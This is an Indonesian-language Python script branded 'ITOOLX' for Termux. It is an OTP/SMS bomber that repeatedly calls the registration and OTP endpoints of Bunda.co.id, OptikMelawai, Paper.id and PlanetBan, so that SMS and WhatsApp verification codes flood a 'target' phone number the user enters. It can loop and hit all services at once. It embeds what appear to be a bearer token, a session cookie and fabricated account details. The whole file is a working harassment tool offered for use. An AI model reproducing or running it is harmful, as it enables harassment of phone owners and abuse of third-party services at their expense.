#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    from rich.live import Live
    from rich.layout import Layout
    from rich.rule import Rule
    from rich.style import Style
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    from rich.live import Live
    from rich.layout import Layout
    from rich.rule import Rule
    from rich.style import Style

console = Console()

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────

BANNER = """
[bold cyan]
 ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
[/bold cyan]"""

# ─────────────────────────────────────────────
#  API CONFIGS
# ─────────────────────────────────────────────

APIS = {
    1: {
        "name": "Bunda.co.id",
        "desc": "OTP via SMS",
        "icon": "📱",
        "cooldown": 120,
        "color": "bright_magenta",
        "method": "bunda",
    },
    2: {
        "name": "OptikMelawai",
        "desc": "OTP via Register SMS",
        "icon": "👓",
        "cooldown": 60,
        "color": "bright_blue",
        "method": "optik",
    },
    3: {
        "name": "Paper.id (SMS)",
        "desc": "OTP via SMS",
        "icon": "📄",
        "cooldown": 30,
        "color": "bright_green",
        "method": "paper_sms",
    },
    4: {
        "name": "Paper.id (WhatsApp)",
        "desc": "OTP via WhatsApp",
        "icon": "💬",
        "cooldown": 30,
        "color": "bright_yellow",
        "method": "paper_wa",
    },
    5: {
        "name": "PlanetBan",
        "desc": "OTP via WhatsApp",
        "icon": "🏪",
        "cooldown": 60,
        "color": "bright_red",
        "method": "planetban",
    },
    6: {
        "name": "ALL TARGETS",
        "desc": "Kirim ke semua API sekaligus",
        "icon": "⚡",
        "cooldown": 120,
        "color": "bold cyan",
        "method": "all",
    },
}

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

# ─────────────────────────────────────────────
#  API FUNCTIONS
# ─────────────────────────────────────────────

def send_bunda(phone: str) -> dict:
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Android WebView\";v=\"150\"",
        "x-locale": "id",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.bunda.co.id",
        "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://www.bunda.co.id/id/hospitals",
        "accept-language": "id-ID,id;q=0.9",
        "priority": "u=1, i",
    }
    payload = json.dumps({"phone_number": int(phone), "type": "auth"})
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_optik(phone: str) -> dict:
    url = "https://api.optikmelawai.com/api/v3/auth/register/1"
    headers = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "language": "id",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Android WebView\";v=\"150\"",
        "x-unique-user": "GA1.1.883509241.1785170487",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://optikmelawai.com",
        "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://optikmelawai.com/",
        "accept-language": "id-ID,id;q=0.9",
        "priority": "u=1, i",
        "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
    }
    files = [
        ("name", (None, "Jonuis Dane")),
        ("sex", (None, "1")),
        ("birth_date", (None, "1995-07-28")),
        ("mobile_number", (None, phone)),
        ("password", (None, "Pangkey2005?")),
        ("repassword", (None, "Pangkey2005?")),
    ]
    try:
        r = requests.post(url, files=files, headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_paper(phone: str, method: str = "sms") -> dict:
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Android WebView\";v=\"150\"",
        "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://paper.id",
        "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://paper.id/",
        "accept-language": "id-ID,id;q=0.9",
        "priority": "u=1, i",
    }
    payload = json.dumps({"phone": phone, "method": method, "registered_by": "flutter mweb"})
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_planetban(phone: str) -> dict:
    url = "https://api.planetban.com/website/customer/request-otp"
    # Strip leading 0 and add 62 if needed
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    # PlanetBan uses 08xxx format
    pb_num = "0" + num[2:] if num.startswith("62") else phone
    headers = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Android WebView\";v=\"150\"",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://planetban.com",
        "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://planetban.com/",
        "accept-language": "id-ID,id;q=0.9",
        "priority": "u=1, i",
    }
    payload = json.dumps({"phone": pb_num, "purpose": "register", "method": "whatsapp"})
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


# ─────────────────────────────────────────────
#  DISPATCH
# ─────────────────────────────────────────────

def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":
        return send_bunda(phone)
    elif method == "optik":
        return send_optik(phone)
    elif method == "paper_sms":
        return send_paper(phone, "sms")
    elif method == "paper_wa":
        return send_paper(phone, "whatsapp")
    elif method == "planetban":
        return send_planetban(phone)
    return {}


def status_color(code: int) -> str:
    if code == 200:
        return "bold green"
    elif code in (201, 202):
        return "bold cyan"
    elif code == 0:
        return "bold red"
    elif code >= 400:
        return "bold red"
    return "bold yellow"


def result_icon(code: int) -> str:
    if code in (200, 201, 202):
        return "✅"
    elif code == 0:
        return "❌"
    return "⚠️"


# ─────────────────────────────────────────────
#  COUNTDOWN
# ─────────────────────────────────────────────

def countdown(seconds: int, label: str = "Cooldown"):
    with Progress(
        SpinnerColumn(spinner_name="dots", style="bold cyan"),
        TextColumn(f"[bold yellow]{label}"),
        BarColumn(bar_width=30, style="cyan", complete_style="bright_cyan"),
        TextColumn("[bold white]{task.percentage:>3.0f}%"),
        TimeRemainingColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            progress.advance(task, 1)


# ─────────────────────────────────────────────
#  UI COMPONENTS
# ─────────────────────────────────────────────

def clear():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    console.print(BANNER)
    console.print(
        Align.center(
            Panel(
                "[bold white]Multi-API OTP Sender Tools[/bold white]\n"
                "[dim]by [bold cyan]ITOOLX[/bold cyan] • Termux Edition[/dim]",
                border_style="cyan",
                padding=(0, 4),
            )
        )
    )
    console.print()


def print_menu():
    table = Table(
        title="[bold cyan]⚡ PILIH TARGET API ⚡[/bold cyan]",
        box=box.DOUBLE_EDGE,
        border_style="cyan",
        header_style="bold cyan",
        show_lines=True,
        min_width=50,
    )
    table.add_column("No", style="bold white", justify="center", width=4)
    table.add_column("Icon", justify="center", width=4)
    table.add_column("Target", style="bold", width=20)
    table.add_column("Mode", width=20)
    table.add_column("Cooldown", justify="center", width=10)

    for num, api in APIS.items():
        table.add_row(
            f"[bold cyan]{num}[/bold cyan]",
            api["icon"],
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            f"[bold yellow]{api['cooldown']}s[/bold yellow]",
        )

    console.print(Align.center(table))
    console.print()


def print_result_panel(api_name: str, phone: str, result: dict, loop: int, total: int):
    code = result.get("status", 0)
    body = result.get("body", "")
    icon = result_icon(code)
    color = status_color(code)

    # Truncate body for display
    preview = body[:120].replace("\n", " ")
    if len(body) > 120:
        preview += "..."

    content = (
        f"[bold white]Target   :[/bold white] [cyan]{api_name}[/cyan]\n"
        f"[bold white]Phone    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
        f"[bold white]Round    :[/bold white] [white]{loop}/{total}[/white]\n"
        f"[bold white]Time     :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
        f"[bold white]Response :[/bold white] [dim]{preview}[/dim]"
    )

    console.print(
        Panel(
            content,
            title=f"[bold]{icon} RESULT[/bold]",
            border_style=color.split()[-1] if "bold" in color else color,
            padding=(1, 2),
        )
    )


def print_all_results(phone: str, results: list, loop: int, total: int):
    table = Table(
        title=f"[bold cyan]⚡ ALL TARGETS — Round {loop}/{total}[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan",
        header_style="bold cyan",
        show_lines=True,
    )
    table.add_column("Icon", justify="center", width=4)
    table.add_column("Target", width=20)
    table.add_column("HTTP", justify="center", width=6)
    table.add_column("Status", width=10)
    table.add_column("Time", width=10)

    for item in results:
        code = item["status"]
        color = status_color(code)
        icon = result_icon(code)
        status_text = "SUCCESS" if code in (200, 201, 202) else ("ERROR" if code == 0 else "FAILED")
        table.add_row(
            item["icon"],
            f"[bold]{item['name']}[/bold]",
            f"[{color}]{code}[/{color}]",
            f"[{color}]{status_text}[/{color}]",
            f"[dim]{item['time']}[/dim]",
        )

    console.print(Align.center(table))


# ─────────────────────────────────────────────
#  MAIN FLOW
# ─────────────────────────────────────────────

def validate_phone(phone: str) -> str:
    """Normalize phone to 62xxx format."""
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("08"):
        return "628" + phone[2:]
    elif phone.startswith("8"):
        return "62" + phone
    elif phone.startswith("+62"):
        return "62" + phone[3:]
    elif phone.startswith("62"):
        return phone
    return phone


def run_single(api_cfg: dict, phone: str, loop_count: int):
    method = api_cfg["method"]
    cooldown_sec = api_cfg["cooldown"]
    name = api_cfg["name"]

    for i in range(1, loop_count + 1):
        console.print(Rule(f"[bold cyan] Round {i}/{loop_count} [/bold cyan]"))

        with console.status(
            f"[bold cyan]Mengirim ke [bright_yellow]{name}[/bright_yellow]...",
            spinner="dots",
        ):
            result = dispatch(method, phone)

        print_result_panel(name, phone, result, i, loop_count)

        if i < loop_count:
            countdown(cooldown_sec, f"Cooldown {cooldown_sec}s sebelum round berikutnya")


def run_all(phone: str, loop_count: int):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    max_cooldown = max(v["cooldown"] for v in targets)

    for i in range(1, loop_count + 1):
        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS — Round {i}/{loop_count} [/bold cyan]"))

        results = []
        for api in targets:
            with console.status(
                f"[bold cyan]Sending → [bright_yellow]{api['name']}[/bright_yellow]...",
                spinner="aesthetic",
            ):
                t = datetime.now().strftime("%H:%M:%S")
                res = dispatch(api["method"], phone)
                results.append({
                    "name": api["name"],
                    "icon": api["icon"],
                    "status": res.get("status", 0),
                    "body": res.get("body", ""),
                    "time": t,
                })
            time.sleep(0.3)  # small delay between targets

        print_all_results(phone, results, i, loop_count)

        if i < loop_count:
            countdown(max_cooldown, f"Cooldown {max_cooldown}s sebelum round berikutnya")


def main():
    clear()
    print_banner()
    print_menu()

    # Pilih API
    while True:
        try:
            choice = IntPrompt.ask(
                "[bold cyan]  ❯[/bold cyan] Pilih nomor target",
                default=1,
            )
            if choice in APIS:
                break
            console.print("[bold red]  ✗ Pilihan tidak valid![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print("\n[bold red]  ✗ Dibatalkan.[/bold red]")
            sys.exit(0)

    api_cfg = APIS[choice]
    console.print(
        f"\n  [bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]"
    )

    # Input nomor HP
    while True:
        try:
            phone_raw = Prompt.ask(
                "[bold cyan]  ❯[/bold cyan] Nomor target [dim](08xxx / 628xxx)[/dim]"
            )
            phone = validate_phone(phone_raw)
            if len(phone) >= 10:
                break
            console.print("[bold red]  ✗ Nomor tidak valid![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print("\n[bold red]  ✗ Dibatalkan.[/bold red]")
            sys.exit(0)

    console.print(f"  [bold white]Phone   :[/bold white] [bright_yellow]{phone}[/bright_yellow]")

    # Jumlah loop
    while True:
        try:
            loop_count = IntPrompt.ask(
                "[bold cyan]  ❯[/bold cyan] Jumlah pengiriman",
                default=1,
            )
            if loop_count >= 1:
                break
            console.print("[bold red]  ✗ Minimal 1![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print("\n[bold red]  ✗ Dibatalkan.[/bold red]")
            sys.exit(0)

    console.print()
    console.print(
        Panel(
            f"[bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]\n"
            f"[bold white]Phone   :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
            f"[bold white]Round   :[/bold white] [white]{loop_count}x[/white]\n"
            f"[bold white]Cooldown:[/bold white] [bold yellow]{api_cfg['cooldown']}s[/bold yellow]",
            title="[bold cyan]📋 KONFIRMASI[/bold cyan]",
            border_style="cyan",
            padding=(1, 2),
        )
    )

    confirm = Prompt.ask(
        "[bold cyan]  ❯[/bold cyan] Lanjut?",
        choices=["y", "n"],
        default="y",
    )
    if confirm.lower() != "y":
        console.print("[bold yellow]  ✗ Dibatalkan.[/bold yellow]")
        sys.exit(0)

    console.print()

    try:
        if api_cfg["method"] == "all":
            run_all(phone, loop_count)
        else:
            run_single(api_cfg, phone, loop_count)
    except KeyboardInterrupt:
        console.print("\n[bold red]\n  ✗ Dihentikan oleh user.[/bold red]")
        sys.exit(0)

    console.print()
    console.print(
        Align.center(
            Panel(
                "[bold green]✅ SELESAI![/bold green]\n[dim]Thanks for using ITOOLX[/dim]",
                border_style="green",
                padding=(1, 4),
            )
        )
    )


if __name__ == "__main__":
    main()
